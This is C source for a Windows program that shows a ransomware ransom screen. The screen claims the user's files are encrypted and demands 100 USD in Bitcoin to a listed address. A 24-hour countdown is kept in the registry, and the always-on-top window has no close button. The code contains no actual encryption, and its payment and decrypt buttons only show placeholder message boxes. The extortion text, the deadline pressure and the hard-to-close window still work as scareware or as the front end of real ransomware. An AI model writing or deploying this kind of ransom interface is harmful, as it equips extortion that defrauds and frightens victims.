#include <windows.h>
#include <commctrl.h>
#include <stdio.h>
#include <time.h>

#pragma comment(lib, "comctl32.lib")

#define SECONDS_24H (24 * 60 * 60)
#define TIMER_ID 1
#define REG_PATH  "Software\\FunEncryptionApp"
#define REG_VALUE "ExpiryTime"

time_t gExpiryTime = 0;

const char g_szClassName[] = "RansomwareWindow";

const char message[] =  "Oh-oh! Many of your files have been encrypted. You will lose them permanently unless you follow the instrcutions.\r\n" 
                        "To get your files back you need to pay 100 USD to the BitCoin address below. Check the payment status with the button. "
                        "If it went through fit <Decrypt> to get your documents back. There may be a 1-hour delay between your payment and the successful decryption.\r\n" 
                        "This is the only way to recover your documents. If you fail to pay within 24 hours, the decryption key will be deleted and your files gone forever.\r\n"
                        "You can look for instructions on BitCoin payments on the internet. Hurry up! Time is ticking...";

// Global handles
HFONT hTitleFont;
HFONT hTextFont;
HWND hStatusBar;
HWND hTimerLabel;
HWND hCopyEdit;
HWND hCopyBtn;


int EnsureExpiryTimeExists(void)
{
    HKEY hKey;
    DWORD disposition;
    ULONGLONG expiry;
    DWORD type;
    DWORD size = sizeof(expiry);

    if (RegCreateKeyExA(
            HKEY_CURRENT_USER,
            REG_PATH,
            0,
            NULL,
            0,
            KEY_READ | KEY_WRITE,
            NULL,
            &hKey,
            &disposition
        ) != ERROR_SUCCESS)
    {
        return 0;
    }

    // Check if value already exists
    if (RegQueryValueExA(
            hKey,
            REG_VALUE,
            NULL,
            &type,
            (BYTE *)&expiry,
            &size
        ) == ERROR_SUCCESS && type == REG_QWORD)
    {
        RegCloseKey(hKey);
        return 1; // value already exists → do nothing
    }

    // Value missing → write expiry
    time_t now = time(NULL);
    expiry = (ULONGLONG)(now + SECONDS_24H);

    RegSetValueExA(
        hKey,
        REG_VALUE,
        0,
        REG_QWORD,
        (BYTE *)&expiry,
        sizeof(expiry)
    );

    RegCloseKey(hKey);
    return 1;
}

time_t ReadExpiryTime(void)
{
    HKEY hKey;
    ULONGLONG expiry = 0;
    DWORD size = sizeof(expiry);

    if (RegOpenKeyExA(
            HKEY_CURRENT_USER,
            REG_PATH,
            0,
            KEY_READ,
            &hKey
        ) != ERROR_SUCCESS)
    {
        return 0;
    }

    if (RegGetValueA(
            hKey,
            NULL,
            REG_VALUE,
            RRF_RT_REG_QWORD,
            NULL,
            &expiry,
            &size
        ) != ERROR_SUCCESS)
    {
        RegCloseKey(hKey);
        return 0;
    }

    RegCloseKey(hKey);
    return (time_t)expiry;
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    static HWND hLabelTitle;
    static HWND hLabelText;
    static HWND hBtnOk;
    static HWND hBtnCancel;
    static HWND hGroup;

    switch (msg)
    {
    case WM_CREATE:
    {
        gExpiryTime = ReadExpiryTime();

        if (gExpiryTime == 0)
        {
            EnsureExpiryTimeExists();
            gExpiryTime = ReadExpiryTime();
        }
        SetTimer(hwnd, TIMER_ID, 1000, NULL);

        // Initialize common controls (status bar)
        INITCOMMONCONTROLSEX icex = { sizeof(icex), ICC_BAR_CLASSES };
        InitCommonControlsEx(&icex);

        // Fonts
        hTitleFont = CreateFont(
            26, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
            DEFAULT_CHARSET, OUT_OUTLINE_PRECIS,
            CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY,
            VARIABLE_PITCH, "Segoe UI");

        hTextFont = CreateFont(
            18, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
            DEFAULT_CHARSET, OUT_DEFAULT_PRECIS,
            CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY,
            VARIABLE_PITCH, "Segoe UI");

        // Outer group box
        hGroup = CreateWindow(
            "BUTTON",
            "",
            WS_CHILD | WS_VISIBLE | BS_GROUPBOX,
            10, 10, 640, 480,
            hwnd, NULL, NULL, NULL
        );

        // Title at top
        hLabelTitle = CreateWindow(
            "STATIC",
            "YOUR FILES ARE ENCRYPTED!",
            WS_CHILD | WS_VISIBLE | SS_CENTER,
            20, 25, 600, 40,
            hwnd, NULL, NULL, NULL
        );
        SendMessage(hLabelTitle, WM_SETFONT, (WPARAM)hTitleFont, TRUE);

        // Scrollable text field below title
        hLabelText = CreateWindow(
            "EDIT",
            message,
            WS_CHILD | WS_VISIBLE | WS_BORDER | WS_VSCROLL | ES_LEFT | ES_MULTILINE | ES_AUTOVSCROLL | ES_READONLY,
            20, 80, 600, 150,
            hwnd, NULL, NULL, NULL
        );
        SendMessage(hLabelText, WM_SETFONT, (WPARAM)hTextFont, TRUE);

        // Smaller copyable text field below big text field
        hCopyEdit = CreateWindow(
            "EDIT",
            "1F9xQeR7KpM3D8Z2A6WcYHnL4BvTtS5uJ",
            WS_CHILD | WS_VISIBLE | WS_BORDER | ES_AUTOHSCROLL | ES_READONLY,
            20, 240, 450, 35,
            hwnd, NULL, NULL, NULL
        );
        SendMessage(hCopyEdit, WM_SETFONT, (WPARAM)hTextFont, TRUE);

        // Copy button next to the small text field
        hCopyBtn = CreateWindow(
            "BUTTON",
            "Copy Bitcoin address",
            WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
            480, 240, 140, 35,
            hwnd, (HMENU)2, NULL, NULL
        );
        SendMessage(hCopyBtn, WM_SETFONT, (WPARAM)hTextFont, TRUE);

        // Timer label below small text + button, bigger font
        hTimerLabel = CreateWindow(
            "STATIC",
            "Loading timer",
            WS_CHILD | WS_VISIBLE | SS_CENTER,
            20, 290, 600, 50,
            hwnd, NULL, NULL, NULL
        );
        HFONT hTimerFont = CreateFont(
            24, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
            DEFAULT_CHARSET, OUT_DEFAULT_PRECIS,
            CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY,
            VARIABLE_PITCH, "Segoe UI");
        SendMessage(hTimerLabel, WM_SETFONT, (WPARAM)hTimerFont, TRUE);

        // Check payment button bottom-right
        hBtnOk = CreateWindow(
            "BUTTON",
            "Check payment",
            WS_CHILD | WS_VISIBLE | BS_DEFPUSHBUTTON,
            480, 360, 140, 40,
            hwnd, (HMENU)1, NULL, NULL
        );
        SendMessage(hBtnOk, WM_SETFONT, (WPARAM)hTextFont, TRUE);

        // New Test button to the left of Check payment
        HWND hBtnTest = CreateWindow(
            "BUTTON",
            "Decrypt",
            WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
            320, 360, 140, 40,  // left of Check payment button
            hwnd, (HMENU)3, NULL, NULL
        );
        SendMessage(hBtnTest, WM_SETFONT, (WPARAM)hTextFont, TRUE);

        // Remove close button
        HMENU hMenu = GetSystemMenu(hwnd, FALSE); 
        if (hMenu)
        {
            DeleteMenu(hMenu, SC_CLOSE, MF_BYCOMMAND);
            DrawMenuBar(hwnd);
        }
    }
    break;

    case WM_SIZE:
    {
        // Resize status bar automatically
        SendMessage(hStatusBar, WM_SIZE, 0, 0);
    }
    break;

    case WM_COMMAND:
        switch (LOWORD(wParam))
        {
        case 1:
            MessageBox(hwnd, "You clicked Check payment status!", "Info", MB_OK | MB_ICONINFORMATION);
            SendMessage(hStatusBar, SB_SETTEXT, 0, (LPARAM)"OK clicked");
            break;

        case 2:
            char buf[256];
            GetWindowTextA(hCopyEdit, buf, sizeof(buf));

            if (OpenClipboard(hwnd))
            {
                EmptyClipboard();
                HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, strlen(buf) + 1);
                memcpy(GlobalLock(hMem), buf, strlen(buf) + 1);
                GlobalUnlock(hMem);
                SetClipboardData(CF_TEXT, hMem);
                CloseClipboard();
            }
        case 3:
            MessageBox(hwnd, "You clicked Decrypt!", "Info", MB_OK | MB_ICONINFORMATION);
            SendMessage(hStatusBar, SB_SETTEXT, 0, (LPARAM)"OK clicked");
            break;

        }
    break;
    case WM_TIMER:
    {
        if (wParam == TIMER_ID)
        {
            time_t now = time(NULL);
            long remaining = (long)difftime(gExpiryTime, now);

            char buf[128];

            if (remaining <= 0)
            {
                KillTimer(hwnd, TIMER_ID);
                strcpy(buf, "Time expired");
            }
            else
            {
                int h = remaining / 3600;
                int m = (remaining % 3600) / 60;
                int s = remaining % 60;

                sprintf(
                    buf,
                    "Time remaining: %02d:%02d:%02d",
                    h, m, s
                );
            }

            SetWindowText(hTimerLabel, buf);
        }
    }
    break;
    case WM_DESTROY:
        KillTimer(hwnd, TIMER_ID);
        DeleteObject(hTitleFont);
        DeleteObject(hTextFont);
        PostQuitMessage(0);
        break;

    default:
        return DefWindowProc(hwnd, msg, wParam, lParam);
    }
    return 0;
}

int CreateBadWindow(HINSTANCE hInstance, int nCmdShow)
{
    WNDCLASSEX wc = { 0 };
    HWND hwnd;
    MSG Msg;

    wc.cbSize = sizeof(WNDCLASSEX);
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = g_szClassName;
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    wc.hIcon = LoadIcon(NULL, IDI_APPLICATION);
    wc.hIconSm = wc.hIcon;
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);

    RegisterClassEx(&wc);

    RECT rc = { 0, 0, 640, 440 }; 
    AdjustWindowRect(&rc, WS_OVERLAPPEDWINDOW, FALSE);
    int width  = rc.right - rc.left;
    int height = rc.bottom - rc.top;

    hwnd = CreateWindowEx(
        WS_EX_TOPMOST,
        g_szClassName,
        "Nasty computer virus",
        WS_OVERLAPPEDWINDOW | WS_VISIBLE,
        CW_USEDEFAULT, CW_USEDEFAULT,
        width, height,
        NULL, NULL, hInstance, NULL
    );

    while (GetMessage(&Msg, NULL, 0, 0))
    {
        TranslateMessage(&Msg);
        DispatchMessage(&Msg);
    }
    return (int)Msg.wParam;
}
